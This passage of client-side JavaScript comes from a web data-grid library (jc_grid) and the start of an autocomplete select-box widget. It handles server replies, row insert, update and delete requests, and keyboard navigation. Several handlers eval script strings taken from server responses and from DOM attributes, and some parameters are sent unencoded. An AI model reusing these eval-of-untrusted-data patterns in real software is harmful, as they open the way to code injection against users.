			for(var iob=0;iob<(error.childElementCount || error.childNodes.length);iob++){
				if(error.childNodes[iob].tagName && error.childNodes[iob].tagName.toLowerCase()=="code"){
					errCode=(error.childNodes[iob] && error.childNodes[iob].childNodes[0]?error.childNodes[iob].childNodes[0].nodeValue:-899);
					errCode=(errCode=='O'?0:'-899');
				}
				if(error.childNodes[iob].tagName && error.childNodes[iob].tagName.toLowerCase()=="initial")
					errName=(error.childNodes[iob] && error.childNodes[iob].childNodes[0]?error.childNodes[iob].childNodes[0].nodeValue:-899);
				if(error.childNodes[iob].tagName && error.childNodes[iob].tagName.toLowerCase()=="description")
					errDesc=(error.childNodes[iob] && error.childNodes[iob].childNodes[0]?error.childNodes[iob].childNodes[0].nodeValue:-899);
					
			}
			//errCode=(error && error.childNodes[0] && error.childNodes[0].childNodes[0]?error.childNodes[0].childNodes[0].nodeValue:-899);
			//errName=(error && error.childNodes[1] && error.childNodes[1].childNodes[0]?error.childNodes[1].childNodes[0].nodeValue:-899);
			//errDesc=(error && error.childNodes[2] && error.childNodes[2].childNodes[0]?error.childNodes[2].childNodes[0].nodeValue:-899);
		}
	}
	else
	if(local.QueryType=="json")
	{
		try{error=vjson['error'];}catch(e){error=errCode=0;errName=errDesc='';}

		if(error)
		{
			if(vjson['errno']){
				errCode=vjson['errno'];
				if(!vjson['errno'] && vjson['code'])errCode=vjson['code'];
				errName=vjson['errname'];
				errDesc=vjson['errdesc'];
				errCode=(errCode=='O'?0:'-898');
			}else {
				errCode=error.code;
				errName=error.initial;
				errDesc=error.description;
				errCode=(errCode=='O'?0:'-898');
			}
		}
	}
	ErrObj={'error':error,'code':errCode,'name':errName,'desc':errDesc};
	return ErrObj;
}
//======================================================
this.valueFromOneBlockArray=function valueFromOneBlockArray(arr){
	if((typeof(arr) == "object")){
		if(arr["@attributes"] && arr["@attributes"]["urldecode"])arr[0]=HtmlDecode(arr[0]);
		return arr[0];
	}
	return arr;
}
//======================================================
this.DBProperties=function DBProperties(dxml)
{
	var Properties={'rowid':0,'jscript':0,'details':'','fields':'','tableid':'id','rows':'','links':'','security':'','hiddens':''};
	var vjson=dxml;
	if(local.QueryType=="xml")// || (dxml.toString && dxml.toString().indexOf("XMLDocument"))
	{
		try{Properties.rowid=local.getXMLNodeValue(dxml.getElementsByTagName('rowid')[0]);}catch(e){console.log("jc_grid.DBProperties problem: rowid: "+e);};
		try{Properties.jscript=HtmlDecode(local.getXMLNodeValue(dxml.getElementsByTagName('jscript')[0]));}catch(e){console.log("jc_grid.DBProperties XML problem: jscript: "+e);};
		
		try{Properties.details=local.getXMLNodeValue(dxml.getElementsByTagName('details')[0]);}catch(e){console.log("jc_grid.DBProperties problem: details: "+e);};
		try{var FieldsStr=local.getXMLNodeValue(dxml.getElementsByTagName('fields')[0]);
		Properties.fields=FieldsStr.split(",");}catch(e){console.log("jc_grid.DBProperties problem: fields: "+e);};
		try{Properties.tableid=local.getXMLNodeValue(dxml.getElementsByTagName('tableid')[0]);}catch(e){console.log("jc_grid.DBProperties problem: tableid: "+e);};
		
	}else
	if(local.QueryType=="json")
	{
		try{if(vjson['rowid']!=undefined)Properties.rowid=(vjson['rowid']);}catch(e){console.log("jc_grid.DBProperties problem: rowid: "+e);};
		//g1=vjson;console.log(vjson);
		try{if(vjson['jscript']!=undefined)Properties.jscript=HtmlDecode(/*JSON.parse*/(local.valueFromOneBlockArray(vjson['jscript'])));}catch(e){console.log("jc_grid.DBProperties JSON problem: jscript: "+e);};

		try{if(vjson['details']!=undefined)Properties.details=(vjson['details']);}catch(e){console.log("jc_grid.DBProperties problem: details: "+e);};
		try{if(vjson['fields']!=undefined)Properties.fields=(vjson['fields']);}catch(e){console.log("jc_grid.DBProperties problem: fields: "+e);};
		try{if(vjson['tableid']!=undefined)Properties.tableid=(vjson['tableid']);}catch(e){console.log("jc_grid.DBProperties problem: tableid: "+e);};
		try{
				
				var objs=vjson['rows'];
				var arr=new Array(),j=0,k=0;
				for(var i in objs)
				{
					if(Array.isArray(objs[i]))
					{
						arr[j]=objs[i];
						j++;
					}else
					if((typeof objs[i]) == "object" ){
						arr[j]=[];k=0;
					    for(var p in objs[i])arr[j][k++]=objs[i][p];
						j++;
					}
				};
				if(Array.isArray(arr[0]))if(Array.isArray(arr[0][0]))arr[0]=arr[0][0];
				Properties.rows=arr;
			}catch(e){console.log("jc_grid.DBProperties problem: rows: "+e);};
			
		try{if(vjson['links']!=undefined)Properties.links=vjson['links'];}catch(e){console.log("jc_grid.DBProperties problem: links: "+e);};
		try{if(vjson['security']!=undefined)Properties.security=vjson['security'];}catch(e){console.log("jc_grid.DBProperties problem: security: "+e);};
		try{if(vjson['hiddens']!=undefined)Properties.hiddens=vjson['hiddens'];}catch(e){console.log("jc_grid.DBProperties problem: hiddens: "+e);};
	}
	return Properties;
}
//======================================================
this.DBInsertProc=function DBInsertProc(dxml)
{
	var ErrObj=local.ErrObj=local.DBError(dxml);
	var vjson=local.vjson=local.dxml=dxml;

	//alert(error.childNodes[0].innerHTML);
	var errCode=local.errCode=ErrObj.code;
	var errName=local.errName=ErrObj.name;
	var errDesc=local.errDesc=ErrObj.desc;
	var error=local.error=ErrObj.error;
	var Properties=local.Properties=local.DBProperties(dxml);
	


	if(errCode==0)
	{
	try{
		//var prop=Properties;
		var RowId=Properties.rowid;
		var JScript=Properties.jscript;

		this.hasDataHeader=0;
		var URLParams,RowDefPar=[],t;
		RowDefPar[0]=[];
		
		try{
			if(JScript)eval(JScript);
		}catch(e){
			//console.log(JScript);
			MessageBox('Error DBInsertProc jc_grid Eval: '+e,'Error','MB_OK');	
			console.log("Error DBInsertProc jc_grid Eval:"+e);
		}

		if(URLParams)
		if(Array.isArray(URLParams) || typeof URLParams == "object")
		{
			for(var d=0;d<local.columnsDBField.length;d++)
			{
				RowDefPar[0][d]=URLParams[local.columnsDBField[d]];
			}
		
			if(local.debug)console.log(URLParams);
			if(local.debug)console.log(local.columnsDBField);
			if(local.debug)console.log(RowDefPar);
			var vRow=local.AppendRow(RowDefPar,[RowId],0);
			//console.log(RowDefPar+" --- "+[RowId]);
			if(vRow.setAttribute)vRow.setAttribute("rowid",RowId);
		}
		
		if(local.afterEventProc)local.afterEventProc(dxml,ErrObj,local.Properties);
		
		}catch(e)
		{
		   MessageBox('Error DBInsertProc jc_grid Body: '+e,'Error','MB_OK');
		   console.log('Error DBInsertProc jc_grid Body: '+e);
		}
		
	}else
	{
	    var msg=true;
		if(local.afterEventProc)msg=local.afterEventProc(dxml,ErrObj,Properties);
		if(msg)
		{
			if(errCode!=-899)
			MessageBox('DBInsertProc Error: (code: '+errCode+') '+errName+': '+errDesc,'DBInsertProc Error::','MB_OK');
			else
			MessageBox('Unknow Error: '+errCode,'Unknow error','MB_OK');
		}
	}
	
}

//======================================================
this.DBInsertRow=function DBInsertRow(aValues,vId,removal)//[[field,value,enc],[field,value]]
{
	if(local.QueryLink && local.QueryLink!="")
	{
	//console.log('AAA: '+aValues);
		if(!vId)vId='0';
		if(local.nextFN==undefined)local.nextFN="gc";
		var PPs=local.PostParams+"&"+local.nextFN+"_req=edit&"+local.nextFN+"_fnc=sv&nextformname="+local.nextFN;
		var PId="&id="+vId+"&"+local.nextFN+"uid="+vId;
		var PRs="",FData="";
		
		if(aValues && String(aValues).toLowerCase()=="[object formdata]")
		{
			FData=aValues;
			FData.append("nextformname",local.nextFN);
			FData.append(local.nextFN+"_req","edit");
			FData.append(local.nextFN+"_fnc","sv");
			FData.append(local.nextFN+"uid",vId);
			FData.append("id",vId);
		}
		else
		if(Array.isArray(aValues) || typeof aValues =="object")
		{
		//console.log('BBB: '+aValues);
			for(var i=0;i<aValues.length;i++)
			if(aValues[i] && aValues[i]!=undefined)
			{
				if(aValues[i][2] && aValues[i][2]==1)
				PRs=PRs+'&'+aValues[i][0]+'='+aValues[i][1];
				else
				PRs=PRs+'&'+aValues[i][0]+'='+encodeURIComponent(aValues[i][1]);
			
				if(aValues[i][0]==local.LinkTableID){vId=aValues[i][1];PId="&id="+vId+"&"+local.nextFN+"uid="+vId;}
			}
			FData=PPs+PId+PRs;
		}
		else
		{
			//console.log('CCC: '+aValues);
		    //aValues=aValues.replace(/\&[a-zA-Z0-9]*_fnc=[^\&]*/g,"").replace(/\&[a-zA-Z0-9]*_req=[^\&]*/g,"").replace(/\&[a-zA-Z0-9]*uid=[^\&]*/g,"").replace(/\&id=[^\&]*/g,"").replace(/\&sid=[^\&]*/g,"").replace(/\&tabnm=[^\&]*/g,"");
			if(aValues){
				if(!removal)removal=[];
				if(removal.indexOf('fnc')!=-1)aValues=aValues.replace(/\&[a-zA-Z0-9_]*_fnc=[^\&]*/g,"");
				if(removal.indexOf('req')!=-1)aValues=aValues.replace(/\&[a-zA-Z0-9_]*_req=[^\&]*/g,"");
				if(removal.indexOf('uid')!=-1)aValues=aValues.replace(/\&[a-zA-Z0-9_]*uid=[^\&]*/g,"");
				if(removal.indexOf('id')!=-1)aValues=aValues.replace(/\&id=[^\&]*/g,"");
				if(removal.indexOf('sid')!=-1)aValues=aValues.replace(/\&sid=[^\&]*/g,"");
				if(removal.indexOf('tabnm')!=-1)aValues=aValues.replace(/\&tabnm=[^\&]*/g,"");
				if(removal.indexOf('phpParam')!=-1)aValues=aValues.replace(/\&phpParam=[^\&]*/g,"");
				//for(var i=0;i<removal.length;i++)aValues=aValues.replace("/\&"+removal[i]+"=[^\&]*/g","");
			}
			
			//if(aValues)PRs="&json-data-x1="+aValues;//data-x1 to jc_query
			FData=PPs+PId+PRs;
		}

		var bSR=new SendRecv();
		bSR.PROCXML=local.DBInsertProc;
		//bSR.Query(local.DefLink+'?phpParam=jc_query&'+SIDNAME+'='+SID+'&UNIQREQUESTID='+GLOB_SEND_ID,'',PPs);
		bSR.Query(local.DefLink+'?UNIQREQUESTID='+GLOB_SEND_ID+'&'+PPs+PId,'',FData);
	}
}
//======================================================
this.DBUpdateRow=function (RefNumber)//[[field,value],[field,value]]
{
	var onRow=local.GetRowObjectIdName(RefNumber);
	var ro=document.getElementById(onRow);
	if(!ro)return '';
	var rId=ro.getAttribute('rowid');
	if(!rId)return '';
	var aValues=new Array();
	
	for(var i=0;i<local.columnsDBField.length;i++)
	if(local.columnsDBField[i])
	{
		var oc=document.getElementById(onRow+'_'+local.columnsId[i]);
		if(oc && oc.getAttribute('changed'))
		{
		aValues[i]=new Array();
		aValues[i][0]=local.columnsDBField[i];
		aValues[i][1]=oc.innerHTML;
		}	
	}
	
	//alert(aValues);
	if(aValues.length)local.DBInsertRow(aValues,rId);
	
}
//======================================================
this.DBDeleteRowProc=function DBDeleteRowProc(dxml)//[[field,value],[field,value]]
{
	var GridCellData,GridLinkData,GridFieldsData,GridSecurityData,GridHiddenData;
	var ErrObj=local.ErrObj=local.DBError(dxml);
	var vjson=local.vjson=local.dxml=dxml;

	//alert(error.childNodes[0].innerHTML);
	var errCode=local.errCode=ErrObj.code;
	var errName=local.errName=ErrObj.name;
	var errDesc=local.errDesc=ErrObj.desc;
	var error=local.error=ErrObj.error;

	var Properties=local.Properties=local.DBProperties(dxml);

	if(errCode==0)
	{
		JScript=Properties.jscript;

		if(JScript)eval(JScript);

		if(GridLinkData){for(var i=0;i<GridLinkData.length;i++)local.RemoveRow('#'+GridLinkData[i]);}
		if(Properties.rowid)local.RemoveRow('#'+Properties.rowid);
		
		if(local.afterEventProc)local.afterEventProc(dxml,ErrObj,Properties);

	}else
	{
	
	    var msg=true;
		if(local.afterEventProc)msg=local.afterEventProc(dxml,ErrObj,Properties);
		alert('DBDeleteRowProc Error: '+errName);
	}
	
	if(local.afterCallBack && local.afterCallBack!=undefined && ((typeof local.afterCallBack)=="function")){
		try{
			local.afterCallBack(dxml,ErrObj,Properties);
		}catch(e){
			console.log("Error: afterCallBack - "+e);
		}
	}
	
}
//======================================================
this.DBDeleteRow=function DBDeleteRow(vId,appendProc,afterCB)//id
{
    if(!appendProc)appendProc='';
	if(local.QueryLink && local.QueryLink!="" && vId)
	{
		if(local.nextFN==undefined)local.nextFN="gc";
		var PPs=local.PostParams+"&"+local.nextFN+"_req=rldel&"+local.nextFN+"_fnc=&nextformname="+local.nextFN;
		PPs+="&id="+vId+"&"+local.nextFN+"uid="+vId;	   
		var bSR=new SendRecv();
		bSR.PROCXML=local.DBDeleteRowProc;
        if(appendProc)bSR.PROCXML=appendProc;
		local.afterCallBack=null;
		if(afterCB)local.afterCallBack=afterCB;
		//bSR.Query(local.DefLink+'?phpParam=jc_query&'+SIDNAME+'='+SID+'&UNIQREQUESTID='+GLOB_SEND_ID,'',PPs);
		bSR.Query(local.DefLink+'?UNIQREQUESTID='+GLOB_SEND_ID+'&'+PPs,'',PPs);
		//local.RemoveRow('#'+RefNumber)
	}
}
//=====================================================
//========= Position change ===========================
//======================================================
this.DBChangePosProc=function DBChangePosProc(dxml)//[[field,value],[field,value]]
{
	var GridCellData,GridLinkData,GridFieldsData,GridSecurityData,GridHiddenData;
	var ErrObj=local.ErrObj=local.DBError(dxml);
	var vjson=local.vjson=local.dxml=dxml;

	//alert(error.childNodes[0].innerHTML);
	var errCode=local.errCode=ErrObj.code;
	var errName=local.errName=ErrObj.name;
	var errDesc=local.errDesc=ErrObj.desc;
	var error=local.error=ErrObj.error;

	var Properties=local.Properties=local.DBProperties(dxml);

	if(errCode==0)
	{
		JScript=Properties.jscript;

		if(JScript)eval(JScript);
		
		if(local.afterEventProc)local.afterEventProc(dxml,ErrObj,Properties);

	}else
	{
	
	    var msg=true;
		if(local.afterEventProc)msg=local.afterEventProc(dxml,ErrObj,Properties);
		alert('DBChangePosProc Error: '+errName);
	}
	
	if(local.afterCallBack && local.afterCallBack!=undefined && ((typeof local.afterCallBack)=="function")){
		try{
			local.afterCallBack(dxml,ErrObj,Properties);
		}catch(e){
			console.log("DBChangePos Error: afterCallBack - "+e);
		}
	}
	
}
//======================================================
this.DBChangePos=function DBChangePos(vId,nPos,nId,appendProc,afterCB)//id
{
    if(!appendProc)appendProc='';
	if(local.QueryLink && local.QueryLink!="" && vId)
	{
		if(local.nextFN==undefined)local.nextFN="gc";
		var PPs=local.PostParams+"&"+local.nextFN+"_set="+vId+"&"+local.nextFN+"_fnc=&"+local.nextFN+"_req=chgpos&nextformname="+local.nextFN;
		if(nPos)PPs+="&"+local.nextFN+"_new_pos="+nPos;
		if(nId)PPs+="&"+local.nextFN+"_new_id="+nId;
		
		PPs+="&id="+vId+"&"+local.nextFN+"uid="+vId;	   
		var bSR=new SendRecv();
		bSR.PROCXML=local.DBChangePosProc;
        if(appendProc)bSR.PROCXML=appendProc;
		local.afterCallBack=null;
		if(afterCB)local.afterCallBack=afterCB;
		//bSR.Query(local.DefLink+'?phpParam=jc_query&'+SIDNAME+'='+SID+'&UNIQREQUESTID='+GLOB_SEND_ID,'',PPs);
		bSR.Query(local.DefLink+'?UNIQREQUESTID='+GLOB_SEND_ID+'&'+PPs,'',PPs);
	}
}

//======================================================
//======================================================
//========== Data Rechange Function ============================================
//======================================================
//======================================================
//##### OVERWRITE EXISTING TR or TD Elements #########
this.RetrieveRowEx=function (vHtmls,vIds,vFields,vSecurity,vHiddens)//GridCellData,GridLinkData,GridFieldsData
{
	for(var cnt=0;cnt<vHtmls.length;cnt++)
	if(vIds[cnt])
	{
		//var tdo=local.GetRefRow('#'+vIds[cnt]);
		//GetRowObject(RowN)
		var secattr=local.gridVarToObjectText(vSecurity,cnt);
		var hddns=local.gridVarToObjectText(vHiddens,cnt);
		tblRow.setAttribute('rowshiddendata',hddns);
		local.SetRowValues('#'+vIds[cnt],vHtmls[cnt],vFields,secattr,hddns);
	}
}
//======================================================
this.RetrieveRowProc=function (dxml)
{
	var Details,FieldsStr,Fields,JScript;
	var ErrObj=local.ErrObj=local.DBError(dxml);
	var vjson=local.vjson=local.dxml=dxml;

	//alert(error.childNodes[0].innerHTML);
	var errCode=local.errCode=ErrObj.code;
	var errName=local.errName=ErrObj.name;
	var errDesc=local.errDesc=ErrObj.desc;
	var error=local.error=ErrObj.error;
	var Properties=local.Properties=local.DBProperties(dxml);
	
	if(errCode==0)
	{

		Details=Properties.details;
		Fields=Properties.fields;
		local.LinkTableID=Properties.tableid;
		JScript=Properties.jscript;
		
		var GridCellData,GridLinkData,GridFieldsData,GridSecurityData,GridHiddenData;
		if(JScript)eval(JScript);
		
		local.GridCellData=GridCellData;
		local.GridLinkData=GridLinkData;
		local.GridFieldsData=GridFieldsData;
		local.GridSecurityData=GridSecurityData;
		local.GridHiddenData=GridHiddenData;
		this.hasDataHeader=1;
		
		local.RetrieveRowEx(GridCellData,GridLinkData,GridFieldsData,GridSecurityData,GridHiddenData);

	}else
	{
		alert('LinkInitProc Error: '+(errCode || '')+';');
	}
}

//======================================================
//##### OVERWRITE EXISTING TR or TD Elements #########
this.RetrieveRow=function (vId)
{
	if(local.QueryLink && local.QueryLink!="" && vId)
	{
		if(local.nextFN==undefined)local.nextFN="gc";
		var PPs=local.PostParams+"&"+local.nextFN+"_req=&"+local.nextFN+"_fnc=&nextformname="+local.nextFN;
		var PRs='';
		if(Array.isArray(vId) || typeof vId == "object")
			{
			for(var i=0;i<vId.length;i++)PRs+="&cid"+vId[i]+"=1";
			}
		else
			{PPs+="&cid"+vId+"=1";}
		
		var bSR=new SendRecv();		
		if(local.QueryProc=="xml")
			bSR.PROCXML=local.RetrieveRowProc;
		else
		if(local.QueryProc=="json")
			bSR.PROCJSON=local.RetrieveRowProc;		
		//bSR.Query(local.DefLink+'?phpParam=jc_query&'+SIDNAME+'='+SID+'&UNIQREQUESTID='+GLOB_SEND_ID,'',PPs);
		bSR.Query(local.DefLink+'?UNIQREQUESTID='+GLOB_SEND_ID+'&'+PPs,'',PPs+PRs);
	}

}
//======================================================
this.setColumnCallback=function(col,fnc)
{
   var idx=local.columnsDBField.indexOf(col);
   if((idx==-1) && isNaN(parseInt(col*1)) && (col!=undefined))idx=parseInt(col);
	if(!idx || isNaN(idx))return false;
   
   local.columnsCallbacks[idx]=fnc;
   var trs=local.tableObject.getElementsByTagName("tr");
   if(local.TagType=="div")trs=local.tableObject.getElementsByClassName("tr");
   var i=0,j=0;
   
   for(i=0;i<trs.length;i++)
   {
		var tblColID=String(trs[i].id)+'_'+String(idx);
		var tblCol=document.getElementById(tblColID);
		var old_innerHTML=tblCol.innerHTML;
		
		try{
			var innerHTML='';
			var cursor={func:"setColumnCallback",myName:local.myName(),myId:local.tableId};
			cursor.row=trs[i];
			cursor.rowN=i;
			cursor.rowId=cursor.myName+"_"+cursor.rowN;
			cursor.dbId=trs[i].getAttribute('rowid');
			cursor.cell=tblCol;
			cursor.cellId=tblColID;
			cursor.oldHTML=old_innerHTML;
			cursor.newHTML='';
			cursor.HTML=cursor.oldHTML;
			
			var vsec=trs[i].getAttribute('rowsecurity');
			cursor.Security={main:1};
			if(String(vsec).length>8)
			{
				eval("vsec="+vsec);
				cursor.Security=vsec;
			}
			eval(fnc);
			tblCol.innerHTML=innerHTML;
		}
		catch(e)
		{
			tblCol.innerHTML=old_innerHTML;
		}
   }
   return true;
}
//======================================================
this.inlineSave=function inlineSave(rowid,nm,val){
	var FrmData=new Array();
	FrmData[0]=new Array("uid",rowid);
	FrmData[1]=new Array(nm,val);
	//console.log(FrmData);
    local.DBInsertRow(FrmData,rowid);
	
	return true;
}
//======================================================
this.GetSaveData=function()
{
return 0;
}
//======================================================
this.Save2Cookie=function()
{
}
//======================================================
this.RecoveryFromCookie=function(){
return 0;
}

//======================================================
this.InitFromData=function(){

}
//======================================================
this.GetEditFormProc=function (cont){
	if(typeof local.blockResultId=="string" && local.blockResultId)local.blockResultObject=document.getElementById(local.blockResultId);
	else
	if(typeof local.blockResultId=="object" && local.blockResultId)local.blockResultObject=local.blockResultId;
	if(local.blockResultObject){
		clearContent(local.blockResultObject);
		local.blockResultObject.innerHTML=cont;
		scriptRunAfterInnerHTML(local.blockResultObject);
	}
	if(local.afterCallBack && local.afterCallBack!=undefined && ((typeof local.afterCallBack)=="function")){
		try{
			local.afterCallBack(cont);
		}catch(e){
			console.log("Error: afterCallBack - "+e);
		}
	}
}
//======================================================
this.GetEditForm=function(bResultId,dbId,VWA,afterCB){
	if(!VWA)VWA='';
	if((!dbId) || (dbId==undefined))dbId=0;
	if(local.QueryLink && local.QueryLink!=""){
		local.blockResultId=bResultId;
		local.afterCallBack=null;
		if(afterCB)local.afterCallBack=afterCB;
		if(local.nextFN==undefined)local.nextFN="gc";
		var PPs=local.PostParams+"&"+local.nextFN+"_req=edit&"+local.nextFN+"_fnc=&nextformname="+local.nextFN+"&phpParam=jc_autogrid2&id="+dbId+"&"+local.nextFN+"uid="+dbId+(VWA?"&WA="+VWA:"");
		dataSender(getLinkEx(local.DefLink+'?UNIQREQUESTID='+GLOB_SEND_ID+'&'+PPs),"",local.GetEditFormProc);
	}
}
//======================================================
	//Public static functions
	this.xGet=function xGet(nm)
	{
		if(nm in xGridObjectsById)return xGridObjectsById[nm];
		
		for(var i=xGridObjects.length-1;i>=0;i--)
		{
			if(xGridObjects[i])
				if(xGridObjects[i].tableId==nm)return xGridObjects[i];
				else
				if(xGridObjects[i].name==nm)return xGridObjects[i];
		}
		return null;
	};

//======================================================	
return this.Init();
	
}//end class
jc_grid.prototype.global = this;

//======================================================
/*xGrid Loader*/
function xGridStartUp(clsName)
{
	var objNameSpace="xGrid";
	if(!clsName)clsName=objNameSpace;
	var els=document.getElementsByClassName(clsName);

	for(var i=0;i<els.length;i++)
	{
		new jc_grid(els[i]);
		
		//x.Init(objNameSpace+"Id"+xCounter,objNameSpace+"Css"+xCounter);//FullWebLink+"?phpParam=jc_query&tabnm=silabusi_sub1"
	}

}
//======================================================
AddEventOnObject(window,"load",function(){xGridStartUp();});
//window.onload=function (){FormularLoading(document);};
//======================================================


/* jc_selectBox.js */

/*
Example:
var sb=new jcSelectBox("jcTestContainer");
sb.draw();
*/

var jcSelectBoxCounter=0;
var xSelectObjects=[];
var xSelectObjectsById={};
//----------------------------------------------------------------------------
function jcSelectBox(vObjectOrId,vName,vDef,vUrl,vCallBack,vDataType,xChange)
{
	var local=this;
	this.ObjectCounter=(jcSelectBoxCounter+1);jcSelectBoxCounter++
	this.myObject=null;
	this.myObjectId="jcSelectBox"+this.ObjectCounter;
	
	this.vObjectOrId=vObjectOrId;
	this.vName=vName;
	this.vDef=vDef;
	this.vUrl=vUrl;
	this.vCallBack=vCallBack;
	this.vDataType=vDataType;
	this.xChange=xChange;
	
	this.ParentID=0;
	this.parent=vObjectOrId;
	
	this.debug=0;
	this.callBack=null;
	this.dataType="json";
	this.delayTime=0;
	this.keypress=null;
	this.afterChangeTimeWait=300;
	this.onEnter="";
	this.onChange="";	
	this.openStatus=0;
	this.value="";
	this.waitingContentIcon='<span class="anim rotate">&#x2699;</span>';
	this.goIcon="&#x21f2;";
	this.collapseDirection="down";
	this.placeholder="";
	this.focused="";
	this.valueURLParamName="q";
	
	this.myInput=null;
	this.myDropbox=null;
	this.myResult=null;
	this.pageCounter=2;	
	this.wordsCount = -1;
	this.wordsLenght = 0;
	this.loadFromStorage=null;
	

this.init=function init(){
	if(typeof local.vObjectOrId !== "object"){
		var prev=local.xGet(local.vObjectOrId);
		if(prev){
			local=prev;
			return local;
		}
		
		local.parent=document.getElementById(local.vObjectOrId);
	}
	
	if(local.parent)
	{

		if(local.parent.id)
			local.ParentID=local.parent.id;
		else
			local.ParentID=local.parent.id="xSelectParentID"+local.ObjectCounter;
	
		if(local.parent.getAttribute("data-debug"))local.debug=local.parent.getAttribute("data-debug");
		
		if(!local.xChange)
		if(local.parent.getAttribute("data-onchange"))local.xChange=local.parent.getAttribute("data-onchange");
		
		if(!local.onEnter)
		if(local.parent.getAttribute("data-onenter"))local.onEnter=local.parent.getAttribute("data-onenter");		

		if(!local.vUrl)
		if(local.parent.getAttribute("data-url"))local.vUrl=local.parent.getAttribute("data-url");
		
		if(!local.vCallBack)
		if(local.parent.getAttribute("data-callback"))local.vCallBack=local.parent.getAttribute("data-callback");
		
		if(!local.keypress)
		if(local.parent.getAttribute("data-keypress"))local.keypress=local.parent.getAttribute("data-keypress");		
		

		if(local.parent.getAttribute("data-collapse-direction"))local.collapseDirection=local.parent.getAttribute("data-collapse-direction");		
		
		if(local.parent.getAttribute("data-placeholder"))local.placeholder=local.parent.getAttribute("data-placeholder");
		
		if(local.parent.getAttribute("data-focused"))local.focused=local.parent.getAttribute("data-focused");						
		
		if(local.parent.getAttribute("data-fsearch"))local.valueURLParamName=local.parent.getAttribute("data-fsearch");	
		
		if(local.parent.getAttribute("data-loadstorage"))local.loadFromStorage=local.parent.getAttribute("data-loadstorage");	

				
				
		if(!local.vDataType)
		if(local.parent.getAttribute("data-type"))local.vDataType=local.parent.getAttribute("data-type");
		
		if(!local.vDef)
		if(local.parent.getAttribute("value"))local.vDef=local.parent.getAttribute("value");
		if(!local.vDef)
		if(local.parent.getAttribute("data-value"))local.vDef=local.parent.getAttribute("data-value");
		
		if(!local.vName)
		if(local.parent.getAttribute("name"))local.vName=local.parent.getAttribute("name");
		if(!local.vName)
		if(local.parent.getAttribute("data-name"))local.vName=local.parent.getAttribute("data-name");
		
		
	
	
		xSelectObjects[local.ObjectCounter]=this;
		if(local.vName)xSelectObjectsById[local.vName]=this;
		
		local.name=local.vName;
		if((!local.vDef) || (local.vDef==undefined))local.vDef="";
		local.value=local.vDef;
		local.onChange=local.xChange;
		
	}
	
	local.url=local.vUrl;
	local.callBack=local.vCallBack;
	local.dataType=local.vDataType;
  
	
	if(local.value==undefined || local.value==undefined)local.value="";
return local;
}	
	
	this.draw=function draw()
	{
		if(local.myObject)return local.myObject;
		local.myObject=document.createElement("div");
		local.myObject.id=local.myObjectId;
		local.myObject.className="jcSelectBox";
		
		local.myInput=document.createElement("input");
		local.myInput.id=local.myObjectId+"_input";
		local.myInput.className="jcInput";
		local.myInput.value=local.value;
		local.myInput.setAttribute('placeholder',this.placeholder);
		local.myInput.setAttribute('autocomplete','off');
		local.myObject.appendChild(local.myInput);
		//AddEventByString(local.myInput,"keypress","local.keypress(event,'"+local.name+"');");
		AddEventOnObject(local.myInput,"keydown",local.keyFuncs);
		AddEventOnObject(local.myInput,"change",function(){local.mySendValue.value=local.myInput.value});
		//AddEventOnObject(local.myInput,"keypress",local.keyFuncs);
		
		local.mySendValue=document.createElement("input");
		local.mySendValue.id=local.myObjectId+"_sendvalue";
		local.mySendValue.name=local.name;
		local.mySendValue.value=local.value;
		local.mySendValue.type="hidden";
		local.myObject.appendChild(local.mySendValue);

    
		local.myButton=document.createElement("div");
		local.myButton.id=local.myObjectId+"_button";
		local.myButton.setAttribute("data-name",local.name);
		local.myButton.innerHTML=local.goIcon;
		local.myButton.className="jcbutton jcButton";
		local.myObject.appendChild(local.myButton);
		AddEventOnObject(local.myButton,"click",local.butClick);

		local.myDropbox=document.createElement("div");
		local.myDropbox.id=local.myObjectId+"_dropbox";
		local.myDropbox.className="jcDropbox";
		local.myObject.appendChild(local.myDropbox);
				
		local.myResult=document.createElement("div");
		local.myResult.id=local.myObjectId+"_result";
		local.myResult.className="jcResult "+local.collapseDirection;
		local.myResult.style.display="none";
		local.myObject.appendChild(local.myResult);

		local.parent.innerHTML="";
		local.parent.appendChild(local.myObject);
		
		if(local.value)local.refresh();
		
		return local.myObject;
	}
	this.Draw=function Draw(){return local.draw();};
	
	this.setContent=function setContent(vdat,vwaiting){local.goIcon=vdat;if(vwaiting)local.waitingContentIcon=vwaiting;if(local.myButton)local.myButton.innerHTML=local.goIcon;}
	this.setIcon=function setIcon(vdat,vwaiting){return local.setContent(vdat,vwaiting);}



this.keyFuncs=function keyFuncs(event){
    event = event || window.event;
    event.target = event.target || event.srcElement;
    var element = event.target;
	
	var index=parseInt(element.getAttribute("data-index"));
	if(!index)index=0;
	var idn=local.myObjectId+"_option";
	var keyDisable=false;
	var key=event.keyCode;//("charCode" in event) ? event.charCode : 
	
	local.openStatus=true;
	
	
//console.log("hit:"+key+"  "+event.type+" "+element.id);
    switch (key) {
      case 38://up key event
      {
		keyDisable=true;
		if(document.getElementById(idn+(index-1)))
		{
			local.open();
			if(document.getElementById(idn+index))
				delClass(document.getElementById(idn+index),"jcFocused");
				
			addClass(document.getElementById(idn+(index-1)),"jcFocused");
			
			local.myResult.scrollTop=document.getElementById(idn+(index-1)).offsetTop-parseInt(local.myResult.clientHeight)/2;
			element.setAttribute("data-index",index-1);
			local.myInput.focus();
		}else
		{
			index=0;
			element.setAttribute("data-index",index);
			if(document.getElementById(idn+index))delClass(document.getElementById(idn+"1"),"jcFocused");
		}

      }break;
      case 40://down key event
      {
		keyDisable=true;
		if(document.getElementById(idn+(index+1)))
		{
			local.open();
			if(document.getElementById(idn+index))
				delClass(document.getElementById(idn+index),"jcFocused");
				
			addClass(document.getElementById(idn+(index+1)),"jcFocused");
			
			
			local.myResult.scrollTop=document.getElementById(idn+(index+1)).offsetTop-parseInt(local.myResult.clientHeight)/2;
			element.setAttribute("data-index",index+1);
			local.myInput.focus();
		}else
		{
			if(index==0)
			{
				element.setAttribute("data-index",0);
				local.mySendValue.value=local.myInput.value;
				local.loadFromServer();
			}
		}
        
      }break;
	  case 27:{
		local.mySendValue.value=local.myInput.value=local.value;
		local.chooseItem();
		local.close();
	  };break;
      case 13://enter key event
      {
		keyDisable=true;
		var el;
		if(index>0){
			if(el=document.getElementById(idn+index))onClickChooseItem(el);
		}else{

			if(typeof local.onEnter=="function")local.onEnter(event);
			else   
			if(typeof local.onEnter=="string"){try{window[sBox.onEnter](event);}catch(e){eval(local.onEnter+'(event);');}}
			else
			if(element.id)
				if(element.id==local.myInput.id){
					local.mySendValue.value=local.myInput.value;
					local.loadFromServer();
				}
		
		}
			
		

      }break;
      default:
